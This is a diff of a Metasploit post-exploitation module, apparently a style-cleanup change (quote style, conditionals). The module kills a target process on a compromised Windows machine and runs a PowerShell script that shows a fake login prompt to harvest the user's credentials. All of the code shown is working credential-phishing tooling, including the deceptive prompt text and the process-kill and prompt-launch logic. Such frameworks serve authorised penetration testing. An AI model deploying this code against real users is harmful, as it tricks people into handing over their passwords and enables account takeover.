@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('PROCESS', [ false, 'Prompt if a specific process is started by the target. (e.g. calc.exe or specify * for all processes)' ]),
-        OptString.new('DESCRIPTION', [ true, 'Message shown in the loginprompt', "{PROCESS_NAME} needs your permissions to start. Please enter user credentials"]),
+        OptString.new('DESCRIPTION', [ true, 'Message shown in the loginprompt', '{PROCESS_NAME} needs your permissions to start. Please enter user credentials']),
       ]
     )
 
@@ -53,19 +53,19 @@ class MetasploitModule < Msf::Post
 
   # Function to run the InvokePrompt powershell script
   def execute_invokeprompt_script(description, process, path)
-    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Invoke-LoginPrompt.ps1"))
+    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'Invoke-LoginPrompt.ps1'))
     if process.nil?
-      sdescription = description.gsub("{PROCESS_NAME} needs your permissions to start. ", "")
-      psh_script = base_script.gsub("R{DESCRIPTION}", "#{sdescription}") << "Invoke-LoginPrompt"
+      sdescription = description.gsub('{PROCESS_NAME} needs your permissions to start. ', '')
+      psh_script = base_script.gsub('R{DESCRIPTION}', sdescription.to_s) << 'Invoke-LoginPrompt'
     else
-      sdescription = description.gsub("{PROCESS_NAME}", process)
-      psh_script2 = base_script.gsub("R{DESCRIPTION}", "#{sdescription}") << "Invoke-LoginPrompt"
-      psh_script = psh_script2.gsub("R{START_PROCESS}", "start-process \"#{path}\"")
+      sdescription = description.gsub('{PROCESS_NAME}', process)
+      psh_script2 = base_script.gsub('R{DESCRIPTION}', sdescription.to_s) << 'Invoke-LoginPrompt'
+      psh_script = psh_script2.gsub('R{START_PROCESS}', "start-process \"#{path}\"")
     end
     compressed_script = compress_script(psh_script)
     cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
     while (d = cmd_out.channel.read)
-      print_good("#{d}")
+      print_good(d.to_s)
     end
   end
 
@@ -75,21 +75,19 @@ class MetasploitModule < Msf::Post
     existingProcs = []
     detected = false
     first = true
-    print_status("Monitoring new processes.")
+    print_status('Monitoring new processes.')
     while detected == false
       sleep 1
       procs = client.sys.process.processes
       procs.each do |p|
-        if p['name'] == process or process == "*"
+        if (p['name'] == process) || (process == '*')
           if first == true
             print_status("#{p['name']} is already running. Waiting on new instances to start")
             existingProcs.push(p['pid'])
-          else
-            if !existingProcs.include? p['pid']
-              print_status("New process detected: #{p['pid']} #{p['name']}")
-              killproc(p['name'], p['pid'], description, p['path'])
-              detected = true
-            end
+          elsif !existingProcs.include? p['pid']
+            print_status("New process detected: #{p['pid']} #{p['name']}")
+            killproc(p['name'], p['pid'], description, p['path'])
+            detected = true
           end
         end
       end
@@ -99,7 +97,7 @@ class MetasploitModule < Msf::Post
 
   # Function to kill the process
   def killproc(process, pid, description, path)
-    print_status("Killing the process and starting the popup script. Waiting on the user to fill in his credentials...")
+    print_status('Killing the process and starting the popup script. Waiting on the user to fill in his credentials...')
     client.sys.process.kill(pid)
     execute_invokeprompt_script(description, process, path)
   end
@@ -111,21 +109,21 @@ class MetasploitModule < Msf::Post
 
     # Powershell installed check
     if have_powershell?
-      print_good("PowerShell is installed.")
+      print_good('PowerShell is installed.')
     else
-      fail_with(Failure::Unknown, "PowerShell is not installed")
+      fail_with(Failure::Unknown, 'PowerShell is not installed')
     end
 
     # Check whether target system is locked
     locked = client.railgun.user32.GetForegroundWindow()['return']
     if locked == 0
-      fail_with(Failure::Unknown, "Target system is locked. This post module cannot start the loginprompt when the target system is locked.")
+      fail_with(Failure::Unknown, 'Target system is locked. This post module cannot start the loginprompt when the target system is locked.')
     end
 
     # Switch to check whether a specific process needs to be monitored, or just show the popup immediatly.
     case process
     when nil
-      print_status("Starting the popup script. Waiting on the user to fill in his credentials...")
+      print_status('Starting the popup script. Waiting on the user to fill in his credentials...')
       execute_invokeprompt_script(description, nil, nil)
     else
       procmon(process, description)
